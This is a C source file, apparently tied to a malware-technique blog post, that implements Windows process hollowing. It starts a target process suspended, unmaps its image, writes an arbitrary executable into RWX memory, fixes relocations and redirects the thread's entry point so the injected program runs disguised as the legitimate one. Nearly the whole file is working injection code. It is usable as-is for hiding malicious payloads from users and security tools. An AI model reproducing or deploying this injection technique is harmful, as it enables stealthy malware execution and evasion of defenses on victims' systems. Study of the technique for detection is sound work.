#include <stdio.h>
#include <intrin.h>
#include "remotePE.h"

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

void ProcessHollowing(PCHAR pHollowedProcess, PCHAR pInjectFile) {
    DWORD dStatus;
    BOOL bStatus;
    STARTUPINFOA SI;
    PROCESS_INFORMATION PI;

    /* Read target file */
    HANDLE hFile = CreateFileA(pInjectFile, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (hFile == -1) ERR("CreateFileA");
    DWORD dwFileSize = GetFileSize(hFile, 0);
    PBYTE pInjectBuffer = malloc(dwFileSize);
    ReadFile(hFile, pInjectBuffer, dwFileSize, 0, 0);
    CloseHandle(hFile);

    //PLOADED_IMAGE pInjectImage = malloc(sizeof(LOADED_IMAGE));
    PIMAGE_NT_HEADERS pInjectNtHeader = pInjectBuffer + ((PIMAGE_DOS_HEADER)pInjectBuffer)->e_lfanew;
    PIMAGE_SECTION_HEADER pInjectSections = pInjectBuffer + ((PIMAGE_DOS_HEADER)pInjectBuffer)->e_lfanew + sizeof(IMAGE_NT_HEADERS64);
    WORD InjectNumberOfSections = pInjectNtHeader->FileHeader.NumberOfSections;
    DWORD InjectSizeOfImage = pInjectNtHeader->OptionalHeader.SizeOfImage;

    memset(&SI, 0, sizeof(SI));
    SI.cb = sizeof(SI);
    memset(&PI, 0, sizeof(PI));

    /* Get some functions that will be used later */
    GetFunctions();

    /* Create a suspended process to be hollowed */
    CreateProcessA(0, pHollowedProcess, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &SI, &PI);
    if (!PI.hProcess) ERR("CreateProcessA");

    CONTEXT CTX;
    PVOID BaseAddress;
    CTX.ContextFlags = CONTEXT_FULL;
    GetThreadContext(PI.hThread, &CTX);
    ReadProcessMemory(PI.hProcess, (PVOID)(CTX.Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
    printf("[+] Remote image base: 0x%llx\n", BaseAddress);

    /* Unmap remote process memory */
    dStatus = fpNtUnmapViewOfSection(PI.hProcess, BaseAddress);
    if (dStatus) ERR("NtUnmapViewOfSection");

    /* Allocate a remote memory to inject */
    PVOID pRemoteMemoryBase = VirtualAllocEx(PI.hProcess, BaseAddress, InjectSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemoryBase) ERR("VirtualAllocEx");
    printf("[+] Memory allocated at: 0x%llx\n", pRemoteMemoryBase);

    /* Check if relocation is needed */
    DWORD64 dwImageBaseDelta = (DWORD64)pRemoteMemoryBase - pInjectNtHeader->OptionalHeader.ImageBase;
    printf("[+] DeltaImageBase: 0x%llx\n", dwImageBaseDelta);

    pInjectNtHeader->OptionalHeader.ImageBase = (DWORD64)pRemoteMemoryBase;

    /* Write header */
    bStatus = WriteProcessMemory(PI.hProcess, pRemoteMemoryBase, pInjectBuffer, pInjectNtHeader->OptionalHeader.SizeOfHeaders, 0);
    if (!bStatus) ERR("Write header");

    /* Write sections */
    IMAGE_SECTION_HEADER RelocSection;
    for (DWORD64 i = 0; i < InjectNumberOfSections; i++) {
        IMAGE_SECTION_HEADER CurrentSection = pInjectSections[i];

        // .reloc
        if (strcmp(CurrentSection.Name, ".reloc") == 0) {
            RelocSection = CurrentSection;
        }

        PVOID pCurrentSectionDestination = (DWORD64)pRemoteMemoryBase + CurrentSection.VirtualAddress;
        bStatus = WriteProcessMemory(PI.hProcess, pCurrentSectionDestination, pInjectBuffer + CurrentSection.PointerToRawData, CurrentSection.SizeOfRawData, 0);
        printf("[+] Section %s written at: 0x%llx\n", CurrentSection.Name, pCurrentSectionDestination);
        if (!bStatus) ERR("Write sections");
    }

    /* Rebase relocation table */
    if (dwImageBaseDelta == 0) {
        printf("[+] Relocation skipped!\n");
        goto modify_entry_point;
    }
    printf("[+] Relocation\n");


    IMAGE_DATA_DIRECTORY RelocDataDirecotry = pInjectNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD dwOffset = 0;
    while (dwOffset < RelocDataDirecotry.Size) {
        PIMAGE_BASE_RELOCATION pBlockHeader = pInjectBuffer + (RelocSection.PointerToRawData + dwOffset);
        printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->VirtualAddress, pBlockHeader->SizeOfBlock);

        dwOffset += sizeof(IMAGE_BASE_RELOCATION);

        DWORD dwEntryCount = (pBlockHeader->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
        printf("%d Entries Must Be Realocated In The Current Block.\n", dwEntryCount);

        PBASE_RELOCATION_ENTRY pBlocks = pInjectBuffer + (RelocSection.PointerToRawData + dwOffset);

        // Relocation type checking
        for (int i = 0; i < dwEntryCount; i++) {
            dwOffset += sizeof(BASE_RELOCATION_ENTRY);

            // Relocation type checking
            if (pBlocks[i].Type == IMAGE_REL_BASED_ABSOLUTE) continue;

            DWORD dwFieldRVA = pBlockHeader->VirtualAddress + pBlocks[i].Offset;
            PVOID dwFiledAddr = (DWORD64)pRemoteMemoryBase + dwFieldRVA;
            DWORD64 dwPatchedAddress = 0;

            //printf("[*] dwFiledAddr: 0x%llx\n", dwFiledAddr);
            ReadProcessMemory(PI.hProcess, dwFiledAddr, &dwPatchedAddress, sizeof(PVOID), NULL);
            printf("0x%llx --> 0x%llx | At:0x%llx\n", dwPatchedAddress, dwPatchedAddress + dwImageBaseDelta, dwFiledAddr);

            dwPatchedAddress += dwImageBaseDelta;
            //printf("[AFTER] 0x%llx\n", dwPatchedAddress);
            WriteProcessMemory(PI.hProcess, dwFiledAddr, &dwPatchedAddress, sizeof(PVOID), NULL);
        }
        puts("");
    }

modify_entry_point:
    __nop();
    /* Modify entry point */
    DWORD64 dwEntryPoint;
    dwEntryPoint = (DWORD64)pRemoteMemoryBase + pInjectNtHeader->OptionalHeader.AddressOfEntryPoint;
    
    if (!GetThreadContext(PI.hThread, &CTX)) ERR("GetThreadContext");

    WriteProcessMemory(PI.hProcess, (LPVOID)(CTX.Rdx + (sizeof(SIZE_T) * 2)), pRemoteMemoryBase, sizeof(DWORD64), NULL);

    CTX.Rcx = dwEntryPoint;
    if (!SetThreadContext(PI.hThread, &CTX)) ERR("SetThreadContext");

    /* Resume thread */
    if (!ResumeThread(PI.hThread)) ERR("ResumeThread");

    WaitForSingleObject(PI.hThread, INFINITE);
    return 0;
}

int main(int argc, char* argv[]) {
    ProcessHollowing(
        "<Path to TargetApp.exe>",
        "<Path to meowApp.exe>"
    );
}

// https://rxored.github.io/post/malware/process-hollowing/process-hollowing/